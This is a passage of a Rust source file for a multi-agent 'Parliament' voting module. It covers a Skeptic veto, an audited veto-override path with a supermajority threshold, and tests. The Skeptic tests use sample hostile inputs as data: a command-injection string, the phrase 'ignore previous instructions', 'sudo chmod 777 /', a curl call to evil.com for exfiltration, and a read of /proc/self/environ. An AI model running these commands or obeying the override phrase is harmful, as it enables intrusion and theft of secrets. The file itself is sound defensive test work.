                .generate(&proposal.quest_id, &opinions, &consensus)
                .map(|p| p.pair_id);
            consensus = Consensus::Reached {
                decision_hash: decision_hash.clone(),
                dpo_pair_id,
            };
        }

        // 发布 ConsensusReached 事件 [Critical]
        if let Consensus::Reached {
            decision_hash,
            dpo_pair_id,
        } = &consensus
        {
            publish_consensus_event(
                &self.event_bus,
                &proposal.quest_id,
                decision_hash,
                dpo_pair_id.as_deref(),
            )
            .await;
        }

        Ok((consensus, Some(metrics)))
    }

    /// 审议提案(带否决覆盖)— 提案 → [Skeptic 否决 → 覆盖] → 辩论 → 投票 → 共识
    ///
    /// # WHY 独立方法
    /// 覆盖否决是高风险操作,需要独立的审计路径。将覆盖逻辑与常规 `deliberate()`
    /// 分离,避免常规调用方意外触发覆盖,同时为覆盖路径提供独立的测试入口。
    ///
    /// # 流程
    /// 0. Skeptic 恶意意图检测(辩论前)
    /// 1. 若检测到否决 **且** 提供了有效的 `VetoOverrideTicket`:
    ///    a. 仍发布 `SkepticVeto` 事件(保留完整否决记录)
    ///    b. 发布 `VetoOverridden` 事件 `[Critical]`(覆盖审计)
    ///    c. 提案继续进入正常辩论流程(步骤 2-7 与 `deliberate()` 相同)
    /// 2. 若检测到否决 **但** 未提供 ticket(或 ticket 不匹配):返回 `Consensus::Vetoed`
    /// 3. 若未检测到否决:直接进入正常辩论流程
    ///
    /// # 安全保证
    /// - Skeptic 检测始终执行(覆盖不跳过检测)
    /// - SkepticVeto 事件始终发布(否决行为有完整记录)
    /// - VetoOverridden 事件在覆盖时发布(覆盖行为有审计记录)
    /// - ticket.proposal_id 必须匹配(防止票据重用)
    ///
    /// # 参数
    /// - `quest`:关联的 Quest
    /// - `proposal`:待审议的提案
    /// - `override_ticket`:可选的否决覆盖票据
    ///
    /// # 返回
    /// 共识判定结果,或辩论超时错误
    pub async fn deliberate_with_override(
        &self,
        quest: &Quest,
        proposal: &Proposal,
        override_ticket: Option<&VetoOverrideTicket>,
    ) -> Result<Consensus, ParliamentError> {
        // M1-T1.1 协调度量接线闭环:override/reopen-veto 复审端到端 wall-clock 计时起点。
        // 此前该路径无计时、无 DebateCompleted 发布,复审延迟完全不进协调度量(度量盲区)。
        // strategy 标签统一用 "full-override" 区分常规 deliberate 路径,避免混淆 EWMA 统计。
        let debate_start = Instant::now();

        // 覆盖标志:记录本次审议是否触发了否决覆盖
        // WHY 独立标志:覆议路径需使用 override_consensus_threshold(0.667),
        // 而常规路径使用 consensus_threshold(0.6)。此标志决定计票时选用哪个阈值。
        let mut override_active = false;

        // 步骤 0:Skeptic 恶意意图检测(始终执行,覆盖不跳过检测)
        if let Some((veto_reason, frozen_capabilities)) =
            self.skeptic.exercise_veto(&quest.quest_id, proposal)
        {
            let veto_reason_str = format!(
                "Skeptic 否决:{:?} 检测到恶意模式 '{}'({:?})— {}",
                veto_reason.intent_type,
                veto_reason.matched_pattern,
                veto_reason.severity,
                veto_reason.detail
            );

            // 检查是否有有效的覆盖票据(if-let 避免 unwrap,符合项目约定)
            let override_ticket_valid =
                override_ticket.filter(|t| t.validate(&proposal.proposal_id));

            if let Some(ticket) = override_ticket_valid {
                // 标记覆盖已激活:后续计票使用 override_consensus_threshold
                override_active = true;
                // === 覆盖路径:发布否决 + 覆盖事件,继续辩论 ===
                info!(
                    quest_id = %quest.quest_id,
                    proposal_id = %proposal.proposal_id,
                    intent_type = %veto_reason.intent_type,
                    override_by = %ticket.override_by,
                    override_reason = %ticket.override_reason,
                    "Skeptic 否决被覆盖 — 提案继续进入辩论"
                );

                // 仍发布 SkepticVeto 事件(保留完整否决记录)
                publish_skeptic_veto_event(
                    &self.event_bus,
                    &quest.quest_id,
                    &veto_reason_str,
                    &frozen_capabilities,
                )
                .await;

                // 发布 VetoOverridden 事件 [Critical](覆盖审计)
                publish_veto_overridden_event(
                    &self.event_bus,
                    &quest.quest_id,
                    &proposal.proposal_id,
                    &veto_reason_str,
                    &ticket.override_reason,
                    &ticket.override_by,
                )
                .await;

                // 注意:不发布 CapabilityFrozen 事件 — 覆盖意味着能力不应被冻结
                // 提案继续进入正常辩论流程
            } else {
                // === 否决路径(无覆盖或票据无效):与 deliberate() 相同 ===
                error!(
                    quest_id = %quest.quest_id,
                    proposal_id = %proposal.proposal_id,
                    intent_type = %veto_reason.intent_type,
                    matched_pattern = %veto_reason.matched_pattern,
                    severity = ?veto_reason.severity,
                    "Skeptic 否决 (SkepticVeto) — 检测到恶意意图"
                );

                publish_skeptic_veto_event(
                    &self.event_bus,
                    &quest.quest_id,
                    &veto_reason_str,
                    &frozen_capabilities,
                )
                .await;

                for cap in &frozen_capabilities {
                    warn!(
                        capability_id = %cap,
                        quest_id = %quest.quest_id,
                        reason = %veto_reason.detail,
                        "能力冻结 (CapabilityFrozen)"
                    );
                    publish_capability_frozen_event(&self.event_bus, cap, &veto_reason.detail)
                        .await;
                }

                // M1-T1.1:否决短路(无有效票据)也上报审议延迟(无投票,vote_rates 与 quality 均为 None)
                publish_debate_completed_event(
                    &self.event_bus,
                    &quest.quest_id,
                    &proposal.proposal_id,
                    debate_start.elapsed().as_secs_f64() * 1000.0,
                    "full-override",
                    None,
                    None,
                    "Vetoed",
                )
                .await;

                return Ok(Consensus::Vetoed {
                    veto_reason: veto_reason_str,
                    frozen_capabilities,
                });
            }
        }

        // === 正常辩论流程(与 deliberate() 步骤 1-7 相同)===
        info!(
            quest_id = %quest.quest_id,
            proposal_id = %proposal.proposal_id,
            "辩论开始 (DebateStarted)"
        );
        publish_debate_started_event(
            &self.event_bus,
            &quest.quest_id,
            &proposal.proposal_id,
            self.registry.count() as u8,
        )
        .await;

        let opinions = self.collect_opinions(quest, proposal).await?;
        self.publish_vote_events(proposal, &opinions).await;

        let total_roles = self.registry.count();
        // WHY 阈值选择:覆议路径(override_active=true)使用更高的
        // override_consensus_threshold(0.667),防止轻率绕过红队安全防线;
        // 常规路径使用 consensus_threshold(0.6)
        let result = if override_active {
            self.vote_counter.count_votes_with_threshold(
                &opinions,
                total_roles,
                proposal,
                self.config.override_consensus_threshold,
            )
        } else {
            self.vote_counter
                .count_votes(&opinions, total_roles, proposal)
        };

        // M1-T1.1 / M2-T2.2:提取度量载体供 DebateCompleted 上报(result.consensus 即将被 move)
        let metrics = DebateVoteMetrics::from_result(&result);

        let mut consensus = result.consensus;
        if let Consensus::Reached { decision_hash, .. } = &consensus {
            let dpo_pair_id = self
                .dpo_generator
                .generate(&proposal.quest_id, &opinions, &consensus)
                .map(|p| p.pair_id);
            consensus = Consensus::Reached {
                decision_hash: decision_hash.clone(),
                dpo_pair_id,
            };
        }

        if let Consensus::Reached {
            decision_hash,
            dpo_pair_id,
        } = &consensus
        {
            publish_consensus_event(
                &self.event_bus,
                &proposal.quest_id,
                decision_hash,
                dpo_pair_id.as_deref(),
            )
            .await;
        }

        // M1-T1.1:override 路径发布 DebateCompleted(消除复审延迟度量盲区 + M2 多维质量)
        publish_debate_completed_event(
            &self.event_bus,
            &quest.quest_id,
            &proposal.proposal_id,
            debate_start.elapsed().as_secs_f64() * 1000.0,
            "full-override",
            Some(metrics.vote_rates()),
            Some(&metrics.quality),
            consensus_outcome_label(&consensus),
        )
        .await;

        Ok(consensus)
    }

    /// 重新开启被 Skeptic 否决的提案(覆议)
    ///
    /// 包装 `deliberate_with_override`,要求提供有效的 `VetoOverrideTicket`,
    /// 并在覆盖路径使用更高的 `override_consensus_threshold`(默认 0.667,
    /// 即 2/3 超级多数)校验共识。
    ///
    /// # WHY 独立公开方法
    /// 覆议是绕过 Skeptic 红队安全防线的高风险操作,需要语义化的公开入口与
    /// 独立的审计路径,避免常规调用方意外触发覆盖。`reopen_veto` 强制要求
    /// ticket 参数不可选,从 API 层面表达"覆议必须显式授权"的意图。
    ///
    /// # 流程(全部委托给 `deliberate_with_override` 覆盖路径)
    /// 1. 票据 `proposal_id` 匹配校验(防重用)— 由覆盖路径内部完成
    /// 2. 超级多数校验(`override_consensus_threshold`)— 由覆盖路径完成
    /// 3. 事件发布(SkepticVeto + VetoOverridden)— 由覆盖路径完成
    ///
    /// # 参数
    /// - `quest`:关联的 Quest
    /// - `proposal`:待审议的提案
    /// - `ticket`:否决覆盖票据(`proposal_id` 必须匹配,防重用)
    ///
    /// # 返回
    /// 共识判定结果:
    /// - 票据失配 → `Consensus::Vetoed`(否决仍生效)
    /// - 票据匹配 + 赞成率 ≥ 0.667 → `Consensus::Reached`
    /// - 票据匹配 + 赞成率 < 0.667 → `Consensus::Rejected`
    pub async fn reopen_veto(
        &self,
        quest: &Quest,
        proposal: &Proposal,
        ticket: &VetoOverrideTicket,
    ) -> Result<Consensus, ParliamentError> {
        // 薄包装:proposal_id 匹配校验与超级多数校验均由
        // deliberate_with_override 的覆盖路径完成,保证审计路径一致。
        self.deliberate_with_override(quest, proposal, Some(ticket))
            .await
    }

    /// 并发收集 5 角色的 Opinion,带超时
    ///
    /// 使用 `FuturesUnordered` 流式处理,5 角色 Opinion 生成并发执行。
    /// 超时后已收集的 Opinion 保留,未完成角色视为弃权(不参与投票)。
    ///
    /// # 错误
    /// - `DebateTimeout`:超时后无任何 Opinion 收集到(极端情况)
    async fn collect_opinions(
        &self,
        quest: &Quest,
        proposal: &Proposal,
    ) -> Result<Vec<Opinion>, ParliamentError> {
        // 委托给 collect_opinions_filtered,传入全部 5 角色
        // WHY 委托:避免 5 角色路径与 filtered 路径逻辑重复,
        // collect_opinions_filtered 是统一的并发收集实现
        self.collect_opinions_filtered(quest, proposal, &Role::all())
            .await
    }

    /// P4-W14.3 S5 接缝:并发收集指定角色集合的 Opinion,带超时
    ///
    /// `Simplified` 策略仅需 Architect + Skeptic + Optimizer 三角色 Opinion,
    /// 此方法支持传入任意角色子集,复用 `FuturesUnordered` 并发收集逻辑。
    ///
    /// # 流程
    /// 1. 为每个角色构建 Opinion 生成 future(clone quest/proposal)
    /// 2. `FuturesUnordered` 并发执行,带超时(`debate_timeout_ms`)
    /// 3. 超时后已收集的 Opinion 保留,未完成角色视为弃权
    ///
    /// # 参数
    /// - `quest`:关联的 Quest
    /// - `proposal`:待审议的提案
    /// - `roles`:参与辩论的角色集合(Full=5 角色,Simplified=3 角色)
    ///
    /// # 错误
    /// - `DebateTimeout`:超时后无任何 Opinion 收集到(极端情况)
    async fn collect_opinions_filtered(
        &self,
        quest: &Quest,
        proposal: &Proposal,
        roles: &[Role],
    ) -> Result<Vec<Opinion>, ParliamentError> {
        let timeout = Duration::from_millis(self.config.debate_timeout_ms);
        let expected = roles.len();

        // M1-T1.2:Arc 共享 quest/proposal,消除每角色深拷贝(O(R×T) → 仅一次 O(T))。
        // WHY:此前每个角色 future 各 clone 整个 Quest(含全部 Task Vec),
        // Full=5 角色 × T 任务 = O(R×T) 深拷贝;改为仅一次深拷贝 + 每 future
        // 克隆 Arc(refcount ~ns)。generate_opinion 签名不变(仍收 &Quest/&Proposal),
        // 通过 deref 强制从 &Arc<T> 得到 &T;收集后计票语义零改动。
        let quest_arc = std::sync::Arc::new(quest.clone());
        let proposal_arc = std::sync::Arc::new(proposal.clone());

        // 构建角色 Opinion 生成 future 流
        let mut stream: FuturesUnordered<_> = roles
            .iter()
            .map(|&role| {
                let quest = std::sync::Arc::clone(&quest_arc);
                let proposal = std::sync::Arc::clone(&proposal_arc);
                async move { generate_opinion(role, &quest, &proposal).await }
            })
            .collect();

        // 并发收集,带超时
        let mut opinions = Vec::new();
        let collect_future = async {
            while let Some(opinion) = stream.next().await {
                opinions.push(opinion);
            }
        };

        match tokio::time::timeout(timeout, collect_future).await {
            Ok(()) => {
                // 所有角色在超时内完成
                Ok(opinions)
            }
            Err(_) => {
                // 超时:已收集的 Opinion 保留,记录告警
                warn!(
                    proposal_id = %proposal.proposal_id,
                    collected = opinions.len(),
                    expected = expected,
                    "辩论超时,部分角色未完成"
                );
                // 若无任何 Opinion 收集到,返回超时错误
                if opinions.is_empty() {
                    Err(ParliamentError::DebateTimeout {
                        timeout_ms: self.config.debate_timeout_ms,
                    })
                } else {
                    // 部分收集:继续流程(法定人数检查会处理参与率不足)
                    Ok(opinions)
                }
            }
        }
    }

    /// 发布所有角色的 VoteCast 事件
    ///
    /// M1-T1.4:改为构造 Vec<VoteCast> 后单次 `publish_batch`,摊销每次
    /// publish 重复的 receiver_count/背压采样固定开销。
    ///
    /// # 顺序安全性(已核实)
    /// VoteCast 下游无相对顺序依赖:TUI 仅倒序展示、immune_system 不消费
    /// VoteCast,唯一契约是"全部 VoteCast 先于 ConsensusReached"——由调用点在
    /// 投票段完成后才发 ConsensusReached 的时序边界天然保证。
    /// publish_batch 严格做 ≤ 串行的工作(仅摊销采样),不会更慢。
    async fn publish_vote_events(&self, proposal: &Proposal, opinions: &[Opinion]) {
        // 构造批量 VoteCast 事件(空 opinions 时 publish_batch 早退,行为等价空循环)
        let events: Vec<NexusEvent> = opinions
            .iter()
            .map(|opinion| NexusEvent::VoteCast {
                metadata: EventMetadata::new("parliament"),
                proposal_id: proposal.proposal_id.clone(),
                voter: opinion.role.as_str().to_string(),
                vote: opinion.is_approve(),
            })
            .collect();
        if let Err(e) = self.event_bus.publish_batch(events).await {
            warn!(error = %e, "批量发布 VoteCast 事件失败");
        }
    }

    /// 获取角色注册表引用(测试与监控用)
    pub fn registry(&self) -> &RoleRegistry {
        &self.registry
    }

    /// 获取配置引用
    pub fn config(&self) -> &ParliamentConfig {
        &self.config
    }

    /// 获取事件总线引用(测试用)
    pub fn event_bus(&self) -> &EventBus {
        &self.event_bus
    }

    /// 获取 Skeptic 否决者引用(测试与监控用)
    pub fn skeptic(&self) -> &Skeptic {
        &self.skeptic
    }

    /// 获取 DPO 训练对生成器引用(测试用)
    pub fn dpo_generator(&self) -> &DpoPairGenerator {
        &self.dpo_generator
    }
}

/// 共识结果→审议结果标签(DebateCompleted 事件的 outcome 字段)
///
/// WHY 独立函数:标签取值("Reached"/"Rejected"/"Vetoed")是事件契约的
/// 一部分,集中定义避免各调用点字符串漂移。
fn consensus_outcome_label(consensus: &Consensus) -> &'static str {
    match consensus {
        Consensus::Reached { .. } => "Reached",
        Consensus::Rejected { .. } => "Rejected",
        Consensus::Vetoed { .. } => "Vetoed",
    }
}

/// 生成单个角色的 Opinion(占位实现)
///
/// WHY 占位实现:Week 5 阶段 NMC 未接入,无法调用真实模型推理。
/// 基于 Quest 特征(任务数、思考模式)与 Proposal 特征(risk_level)
/// 的规则化生成,模拟 5 角色的差异化决策倾向。
///
/// Week 6 NMC 接入后,此函数替换为模型推理调用。
///
/// # 各角色决策规则(占位)
/// - **Architect**:任务数少(≤3)→ 赞成(架构简单),多 → 反对(复杂度高)
/// - **Skeptic**:risk_level > 0.5 → 反对(风险厌恶),0.3-0.5 → 弃权,< 0.3 → 赞成
/// - **Optimizer**:Fast 模式 → 赞成(快速),Standard → 弃权,Deep → 反对(慢)
/// - **Librarian**:任务数 ≤ 5 → 赞成(有先例),> 5 → 弃权(无先例)
/// - **Bard**:总是赞成(创意发散,鼓励尝试)
async fn generate_opinion(role: Role, quest: &Quest, proposal: &Proposal) -> Opinion {
    // 模拟异步 Opinion 生成(Week 6 接入真实模型后替换)
    // WHY yield:让出调度,允许 FuturesUnordered 并发处理其他角色
    tokio::task::yield_now().await;

    let task_count = quest.tasks.len();
    let risk = proposal.risk_level;

    match role {
        Role::Architect => {
            // 架构师:任务数少 → 赞成,多 → 反对
            if task_count <= 3 {
                Opinion::new(
                    Role::Architect,
                    1.0,
                    0.85,
                    format!("架构简单({task_count} 任务),赞成"),
                )
            } else {
                Opinion::new(
                    Role::Architect,
                    0.0,
                    0.80,
                    format!("架构复杂({task_count} 任务),反对"),
                )
            }
        }
        Role::Skeptic => {
            // 怀疑者:风险厌恶,red team 视角
            if risk > 0.5 {
                Opinion::new(
                    Role::Skeptic,
                    0.0,
                    0.95,
                    format!("高风险(risk={risk:.2}),否决"),
                )
            } else if risk > 0.3 {
                Opinion::new(
                    Role::Skeptic,
                    0.5,
                    0.70,
                    format!("中风险(risk={risk:.2}),弃权"),
                )
            } else {
                Opinion::new(
                    Role::Skeptic,
                    1.0,
                    0.75,
                    format!("低风险(risk={risk:.2}),赞成"),
                )
            }
        }
        Role::Optimizer => {
            // 优化者:关注执行效率
            match quest.thinking_mode {
                ThinkingMode::Fast => {
                    Opinion::new(Role::Optimizer, 1.0, 0.85, "Fast 模式,性能优先,赞成")
                }
                ThinkingMode::Standard => {
                    Opinion::new(Role::Optimizer, 0.5, 0.70, "Standard 模式,性能中等,弃权")
                }
                ThinkingMode::Deep => {
                    Opinion::new(Role::Optimizer, 0.0, 0.80, "Deep 模式,性能开销大,反对")
                }
            }
        }
        Role::Librarian => {
            // 图书馆员:任务数少 → 有先例 → 赞成
            if task_count <= 5 {
                Opinion::new(
                    Role::Librarian,
                    1.0,
                    0.75,
                    format!("任务数 {task_count},有历史先例,赞成"),
                )
            } else {
                Opinion::new(
                    Role::Librarian,
                    0.5,
                    0.60,
                    format!("任务数 {task_count},无充分先例,弃权"),
                )
            }
        }
        Role::Bard => {
            // 吟游诗人:创意发散,总是赞成
            Opinion::new(Role::Bard, 1.0, 0.65, "创意方案,鼓励尝试,赞成")
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use event_bus::NexusEvent;
    use nexus_core::{Task, TaskStatus};

    fn make_parliament() -> Parliament {
        let config = ParliamentConfig::default();
        let bus = EventBus::new();
        Parliament::new(config, bus)
    }

    fn make_quest(task_count: usize, thinking_mode: ThinkingMode) -> Quest {
        let tasks: Vec<Task> = (0..task_count)
            .map(|i| Task {
                task_id: format!("t-{i}"),
                description: format!("任务 {i}"),
                status: TaskStatus::Pending,
                dependencies: vec![],
            })
            .collect();
        Quest {
            quest_id: "q-1".into(),
            title: "测试 Quest".into(),
            tasks,
            thinking_mode,
            checkpoint_id: None,
            priority: 128,
        }
    }

    fn make_proposal(risk_level: f32) -> Proposal {
        Proposal::new("p-1", "q-1", "测试提案", risk_level)
    }

    #[tokio::test]
    async fn test_all_approve_reaches_consensus() {
        // 低风险 + 少任务 + Fast 模式 → 全赞成
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);

        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();

        assert!(consensus.is_reached(), "低风险少任务应达成共识");
    }

    #[tokio::test]
    async fn test_high_risk_skeptic_veto() {
        // 高风险 → Skeptic 否决
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.8);

        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();

        assert!(consensus.is_vetoed(), "高风险应触发 Skeptic 否决");
    }

    #[tokio::test]
    async fn test_complex_task_rejected() {
        // 多任务(>3)→ Architect 反对;Deep 模式 → Optimizer 反对
        // Skeptic 低风险赞成,Bard 赞成,Librarian 弃权(>5 任务)
        // 非弃权权重:Architect(0.25) + Skeptic(0.30) + Optimizer(0.20) + Bard(0.10) = 0.85
        // 赞成:Skeptic(0.30) + Bard(0.10) = 0.40,赞成率 = 0.40/0.85 ≈ 0.47 < 0.6 → Rejected
        let parliament = make_parliament();
        let quest = make_quest(7, ThinkingMode::Deep);
        let proposal = make_proposal(0.2);

        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();

        assert!(consensus.is_rejected(), "复杂任务应被拒绝");
        assert!(!consensus.is_vetoed(), "低风险不应触发否决");
    }

    #[tokio::test]
    async fn test_partial_approve_reaches_consensus() {
        // 中等任务(4)+ Standard 模式 + 低风险
        // Architect(4 任务 > 3)反对,Skeptic(低风险)赞成,
        // Optimizer(Standard)弃权,Librarian(≤5)赞成,Bard 赞成
        // 非弃权权重:0.25 + 0.30 + 0.15 + 0.10 = 0.80
        // 赞成:0.30 + 0.15 + 0.10 = 0.55,赞成率 = 0.55/0.80 = 0.6875 ≥ 0.6 → Reached
        let parliament = make_parliament();
        let quest = make_quest(4, ThinkingMode::Standard);
        let proposal = make_proposal(0.2);

        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();

        assert!(consensus.is_reached(), "部分赞成应达成共识");
    }

    #[tokio::test]
    async fn test_debate_completes_within_timeout() {
        // 辩论应在超时内完成(占位实现极快)
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);

        let start = std::time::Instant::now();
        let _ = parliament.deliberate(&quest, &proposal).await.unwrap();
        let elapsed = start.elapsed();

        // 占位实现应在 200ms 内完成(SubTask 30.3 验证标准)
        assert!(
            elapsed < Duration::from_millis(200),
            "辩论延迟应 < 200ms,实际: {elapsed:?}"
        );
    }

    #[tokio::test]
    async fn test_consensus_reached_event_published() {
        let bus = EventBus::new();
        let mut rx = bus.subscribe();

        let parliament = Parliament::new(ParliamentConfig::default(), bus);
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);

        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();
        assert!(consensus.is_reached());

        // 应收到 ConsensusReached 事件(Critical)
        // WHY 跳过 VoteCast:deliberate 先发布 5 个 VoteCast,再发布 ConsensusReached
        let mut found_consensus = false;
        for _ in 0..10 {
            match tokio::time::timeout(Duration::from_millis(500), rx.recv()).await {
                Ok(Ok(event)) => {
                    if event.type_name() == "ConsensusReached" {
                        found_consensus = true;
                        break;
                    }
                }
                _ => break,
            }
        }
        assert!(found_consensus, "应发布 ConsensusReached 事件");
    }

    #[tokio::test]
    async fn test_vote_cast_events_published() {
        let bus = EventBus::new();
        let mut rx = bus.subscribe();

        let parliament = Parliament::new(ParliamentConfig::default(), bus);
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);

        let _ = parliament.deliberate(&quest, &proposal).await.unwrap();

        // 应收到至少 5 个 VoteCast 事件 + 1 个 ConsensusReached 事件
        let mut vote_count = 0;
        let mut consensus_count = 0;
        for _ in 0..10 {
            match tokio::time::timeout(Duration::from_millis(100), rx.recv()).await {
                Ok(Ok(event)) => match event.type_name() {
                    "VoteCast" => vote_count += 1,
                    "ConsensusReached" => consensus_count += 1,
                    _ => {}
                },
                _ => break,
            }
        }
        assert_eq!(vote_count, 5, "应发布 5 个 VoteCast 事件");
        assert_eq!(consensus_count, 1, "应发布 1 个 ConsensusReached 事件");
    }

    #[tokio::test]
    async fn test_no_consensus_event_on_rejection() {
        let bus = EventBus::new();
        let mut rx = bus.subscribe();

        let parliament = Parliament::new(ParliamentConfig::default(), bus);
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.8); // 高风险 → Skeptic 否决

        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();
        assert!(consensus.is_vetoed());

        // 不应收到 ConsensusReached 事件(否决不发布)
        let mut found_consensus = false;
        for _ in 0..10 {
            match tokio::time::timeout(Duration::from_millis(100), rx.recv()).await {
                Ok(Ok(event)) if event.type_name() == "ConsensusReached" => {
                    found_consensus = true;
                }
                _ => {}
            }
        }
        assert!(!found_consensus, "否决不应发布 ConsensusReached 事件");
    }

    #[test]
    fn test_generate_opinion_architect_simple() {
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);

        let rt = tokio::runtime::Runtime::new().unwrap();
        let opinion = rt.block_on(generate_opinion(Role::Architect, &quest, &proposal));

        // 2 任务 ≤ 3 → 赞成
        assert!(opinion.is_approve());
    }

    #[test]
    fn test_generate_opinion_architect_complex() {
        let quest = make_quest(5, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);

        let rt = tokio::runtime::Runtime::new().unwrap();
        let opinion = rt.block_on(generate_opinion(Role::Architect, &quest, &proposal));

        // 5 任务 > 3 → 反对
        assert!(opinion.is_reject());
    }

    #[test]
    fn test_generate_opinion_skeptic_high_risk() {
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.8);

        let rt = tokio::runtime::Runtime::new().unwrap();
        let opinion = rt.block_on(generate_opinion(Role::Skeptic, &quest, &proposal));

        // 高风险 → 反对
        assert!(opinion.is_reject());
    }

    #[test]
    fn test_generate_opinion_skeptic_medium_risk() {
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.4);

        let rt = tokio::runtime::Runtime::new().unwrap();
        let opinion = rt.block_on(generate_opinion(Role::Skeptic, &quest, &proposal));

        // 中风险 → 弃权
        assert!(opinion.is_abstain());
    }

    #[test]
    fn test_generate_opinion_skeptic_low_risk() {
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);

        let rt = tokio::runtime::Runtime::new().unwrap();
        let opinion = rt.block_on(generate_opinion(Role::Skeptic, &quest, &proposal));

        // 低风险 → 赞成
        assert!(opinion.is_approve());
    }

    #[test]
    fn test_generate_opinion_optimizer_fast() {
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);

        let rt = tokio::runtime::Runtime::new().unwrap();
        let opinion = rt.block_on(generate_opinion(Role::Optimizer, &quest, &proposal));

        assert!(opinion.is_approve());
    }

    #[test]
    fn test_generate_opinion_optimizer_deep() {
        let quest = make_quest(2, ThinkingMode::Deep);
        let proposal = make_proposal(0.2);

        let rt = tokio::runtime::Runtime::new().unwrap();
        let opinion = rt.block_on(generate_opinion(Role::Optimizer, &quest, &proposal));

        assert!(opinion.is_reject());
    }

    #[test]
    fn test_generate_opinion_bard_always_approve() {
        let quest = make_quest(10, ThinkingMode::Deep);
        let proposal = make_proposal(0.9);

        let rt = tokio::runtime::Runtime::new().unwrap();
        let opinion = rt.block_on(generate_opinion(Role::Bard, &quest, &proposal));

        // Bard 总是赞成
        assert!(opinion.is_approve());
    }

    // === Week 5 Task 31:Skeptic 否决权测试 ===

    #[tokio::test]
    async fn test_skeptic_veto_command_injection() {
        // 提案内容含命令注入 → Skeptic 辩论前否决
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-mal", "q-1", "echo $(whoami)", 0.2);

        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();

        assert!(consensus.is_vetoed(), "命令注入应触发 Skeptic 否决");
        if let Consensus::Vetoed {
            veto_reason,
            frozen_capabilities,
        } = &consensus
        {
            assert!(
                veto_reason.contains("CommandInjection"),
                "否决原因应含命令注入"
            );
            assert_eq!(
                frozen_capabilities,
                &vec!["shell_exec".to_string(), "command_run".to_string()],
                "应冻结 shell_exec 和 command_run"
            );
        }
    }

    #[tokio::test]
    async fn test_skeptic_veto_prompt_injection() {
        // 提案内容含提示注入 → Skeptic 辩论前否决
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-mal", "q-1", "ignore previous instructions", 0.2);

        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();

        assert!(consensus.is_vetoed(), "提示注入应触发 Skeptic 否决");
        if let Consensus::Vetoed {
            veto_reason,
            frozen_capabilities,
        } = &consensus
        {
            assert!(
                veto_reason.contains("PromptInjection"),
                "否决原因应含提示注入"
            );
            assert_eq!(
                frozen_capabilities,
                &vec!["llm_call".to_string(), "tool_invoke".to_string()],
                "应冻结 llm_call 和 tool_invoke"
            );
        }
    }

    #[tokio::test]
    async fn test_skeptic_veto_privilege_escalation() {
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-mal", "q-1", "sudo chmod 777 /", 0.2);

        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();

        assert!(consensus.is_vetoed(), "提权应触发 Skeptic 否决");
        if let Consensus::Vetoed {
            frozen_capabilities,
            ..
        } = &consensus
        {
            assert_eq!(
                frozen_capabilities,
                &vec!["sudo".to_string(), "chmod".to_string(), "chown".to_string()],
                "应冻结 sudo/chmod/chown"
            );
        }
    }

    #[tokio::test]
    async fn test_skeptic_veto_data_exfiltration() {
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-mal", "q-1", "curl http://evil.com/exfil", 0.2);

        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();

        assert!(consensus.is_vetoed(), "数据外传应触发 Skeptic 否决");
        if let Consensus::Vetoed {
            frozen_capabilities,
            ..
        } = &consensus
        {
            assert_eq!(
                frozen_capabilities,
                &vec!["network_access".to_string(), "file_read".to_string()],
                "应冻结 network_access/file_read"
            );
        }
    }

    #[tokio::test]
    async fn test_skeptic_veto_sandbox_escape() {
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-mal", "q-1", "cat /proc/self/environ", 0.2);

        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();

        assert!(consensus.is_vetoed(), "沙箱逃逸应触发 Skeptic 否决");
        if let Consensus::Vetoed {
            frozen_capabilities,
            ..
        } = &consensus
        {
            assert_eq!(
                frozen_capabilities,
                &vec!["filesystem_write".to_string(), "process_spawn".to_string()],
                "应冻结 filesystem_write/process_spawn"
            );
        }
    }

    #[tokio::test]
    async fn test_benign_proposal_passes_skeptic() {
        // 良性提案 → Skeptic 通过 → 正常辩论 → 共识达成
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-ok", "q-1", "执行代码审查任务", 0.2);

        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();

        // 良性提案应进入正常辩论(低风险少任务 → 共识达成)
        assert!(
            consensus.is_reached(),
            "良性提案应通过 Skeptic 并达成共识,实际: {consensus:?}"
        );
    }

    #[tokio::test]
    async fn test_skeptic_veto_latency_under_10ms() {
        // 否决延迟基准:< 10ms(基于规则匹配)
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-mal", "q-1", "echo $(whoami)", 0.2);

        let start = std::time::Instant::now();
